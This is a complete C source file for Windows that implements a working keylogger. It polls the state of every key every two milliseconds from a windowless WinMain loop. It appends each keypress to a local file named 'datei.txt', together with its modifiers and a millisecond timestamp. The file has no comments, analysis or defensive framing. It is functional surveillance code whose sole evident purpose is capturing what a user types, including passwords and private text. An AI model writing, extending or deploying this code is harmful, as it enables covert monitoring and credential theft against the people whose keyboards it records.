#include <windows.h>
#include <stdio.h>

static BOOL IsDown(int vk) {
    return (GetAsyncKeyState(vk) & 0x8000) != 0;
}

static void BuildKeyboardState(BYTE ks[256]) {
    for (int i = 0; i < 256; i++)
        ks[i] = IsDown(i) ? 0x80 : 0x00;
    if (GetKeyState(VK_CAPITAL) & 0x0001) ks[VK_CAPITAL] |= 0x01;
    if (GetKeyState(VK_NUMLOCK) & 0x0001) ks[VK_NUMLOCK] |= 0x01;
    if (GetKeyState(VK_SCROLL)  & 0x0001) ks[VK_SCROLL]  |= 0x01;
}

const char* GetSpecialKeyName(int key) {
    switch (key) {
        case VK_BACK:     return "[BACKSPACE]";
        case VK_RETURN:   return "[ENTER]";
        case VK_SHIFT:    return "[SHIFT]";
        case VK_LSHIFT:   return "[LSHIFT]";
        case VK_RSHIFT:   return "[RSHIFT]";
        case VK_CONTROL:  return "[CTRL]";
        case VK_LCONTROL: return "[LCTRL]";
        case VK_RCONTROL: return "[RCTRL]";
        case VK_MENU:     return "[ALT]";
        case VK_LMENU:    return "[LALT]";
        case VK_RMENU:    return "[RALT]";
        case VK_TAB:      return "[TAB]";
        case VK_SPACE:    return "[SPACE]";
        case VK_ESCAPE:   return "[ESC]";
        case VK_DELETE:   return "[DEL]";
        case VK_LEFT:     return "[LEFT]";
        case VK_RIGHT:    return "[RIGHT]";
        case VK_UP:       return "[UP]";
        case VK_DOWN:     return "[DOWN]";
        case VK_HOME:     return "[HOME]";
        case VK_END:      return "[END]";
        case VK_PRIOR:    return "[PAGEUP]";
        case VK_NEXT:     return "[PAGEDOWN]";
        case VK_CAPITAL:  return "[CAPSLOCK]";
        case VK_F1:       return "[F1]";
        case VK_F2:       return "[F2]";
        case VK_F3:       return "[F3]";
        case VK_F4:       return "[F4]";
        case VK_F5:       return "[F5]";
        case VK_F6:       return "[F6]";
        case VK_F7:       return "[F7]";
        case VK_F8:       return "[F8]";
        case VK_F9:       return "[F9]";
        case VK_F10:      return "[F10]";
        case VK_F11:      return "[F11]";
        case VK_F12:      return "[F12]";
        default: return NULL;
    }
}

static void BuildModifierPrefix(char *buf, size_t bufSize) {
    buf[0] = '\0';
    BOOL ctrl  = IsDown(VK_CONTROL) || IsDown(VK_LCONTROL) || IsDown(VK_RCONTROL);
    BOOL shift = IsDown(VK_SHIFT)   || IsDown(VK_LSHIFT)   || IsDown(VK_RSHIFT);
    BOOL alt   = IsDown(VK_MENU)    || IsDown(VK_LMENU)    || IsDown(VK_RMENU);
    if (ctrl)  strncat(buf, "CTRL+",  bufSize - strlen(buf) - 1);
    if (shift) strncat(buf, "SHIFT+", bufSize - strlen(buf) - 1);
    if (alt)   strncat(buf, "ALT+",   bufSize - strlen(buf) - 1);
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    static SHORT lastState[256] = {0};

    while (1) {
        for (int key = 0; key < 256; key++) {
            SHORT state = GetAsyncKeyState(key);

            if ((state & 0x8000) && !(lastState[key] & 0x8000)) {
                SYSTEMTIME st;
                GetLocalTime(&st);

                FILE *file = fopen("datei.txt", "a");
                if (!file) { lastState[key] = state; continue; }

                const char* special = GetSpecialKeyName(key);

                if (special != NULL) {
                    BOOL isModifier = (key == VK_SHIFT    || key == VK_LSHIFT   ||
                                       key == VK_RSHIFT   || key == VK_CONTROL  ||
                                       key == VK_LCONTROL || key == VK_RCONTROL ||
                                       key == VK_MENU     || key == VK_LMENU    ||
                                       key == VK_RMENU);
                    char prefix[64] = "";
                    if (!isModifier) BuildModifierPrefix(prefix, sizeof(prefix));

                    fprintf(file,
                        "%02d.%02d.%04d %02d:%02d:%02d.%03d - %s%s\n",
                        st.wDay, st.wMonth, st.wYear,
                        st.wHour, st.wMinute, st.wSecond, st.wMilliseconds,
                        prefix, special);

                } else {
                    BYTE ks[256];
                    BuildKeyboardState(ks);

                    BOOL altDown = IsDown(VK_MENU) || IsDown(VK_LMENU) || IsDown(VK_RMENU);
                    BOOL altGr   = altDown && (IsDown(VK_CONTROL) || IsDown(VK_LCONTROL) || IsDown(VK_RCONTROL));

                    if (altDown && !altGr) {
                        ks[VK_MENU]  = 0x00;
                        ks[VK_LMENU] = 0x00;
                        ks[VK_RMENU] = 0x00;
                    }

                    WORD character = 0;
                    int result = ToAscii(key, MapVirtualKey(key, MAPVK_VK_TO_VSC), ks, &character, 0);

                    if (result == 1) {
                        char c = (char)(character & 0xFF);
                        char prefix[64] = "";
                        BuildModifierPrefix(prefix, sizeof(prefix));

                        fprintf(file,
                            "%02d.%02d.%04d %02d:%02d:%02d.%03d - %s%c\n",
                            st.wDay, st.wMonth, st.wYear,
                            st.wHour, st.wMinute, st.wSecond, st.wMilliseconds,
                            prefix, c);
                    }
                }

                fclose(file);
            }

            lastState[key] = state;
        }
        Sleep(2);
    }
    return 0;
}
